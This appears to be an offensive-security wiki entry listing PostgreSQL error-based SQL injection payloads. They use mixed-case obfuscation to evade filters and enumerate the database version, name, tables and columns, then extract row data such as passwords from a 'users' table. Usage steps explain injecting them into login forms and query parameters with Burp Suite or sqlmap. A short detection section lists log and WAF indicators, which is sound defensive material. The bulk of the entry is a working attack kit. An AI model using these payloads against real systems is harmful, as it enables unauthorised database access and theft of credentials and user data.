---
id: edc99756-1b66-400f-946b-aeba98b7d4d0
type: code
language: SQL
verified: true
created_at: '2023-04-06T03:56:35.741538+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
tags:
  - postgresql
  - sql-injection
  - error-based
platforms:
  - PostgreSQL
validated: true
---

# PostgreSQL-Error-Based-Injection-Payloads

## Code

```sql
,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC)
,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)--
,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)

' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1
' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1
' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1
```

## Description

This SQL code contains multiple payloads designed for error-based injection in PostgreSQL databases. They force casting errors to leak information via error messages, including the database version, current database name, table names, column names, and data from specific tables. The payloads use obfuscation (mixed case, concatenation with CHR(126) as delimiters) to evade basic filters and target information_schema views for schema enumeration.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| data_offset | Integer offset for pagination (e.g., to fetch next table/column/data row) | 0, 1, 2 |
| data_table | Name of the target table for column or data extraction | 'users' |
| data_column | Name of the specific column to extract data from | 'password' |

## Usage

These payloads are injected into vulnerable web application parameters (e.g., POST data in login forms or GET queries). Append or replace the injectable field with the payload, submit the request, and parse the resulting error message for the leaked data delimited by ~ (CHR(126)). Use incrementally increasing data_offset to enumerate multiple items. Ideal for manual testing with tools like Burp Suite or browser developer tools; automate with sqlmap using --technique=E for error-based.

## Detection

- Web application logs showing SQL errors with CAST or information_schema queries.
- WAF alerts on mixed-case SQL keywords, CONCAT, or CHR functions in input.
- Database logs recording failed type conversions or anomalous SELECTs from information_schema.
- Increased error rates in application responses containing database details.

## Related

- [[procedures/PostgreSQL-Error-Based-Injection-for-Database-and-Table-Information-Retrieval]]
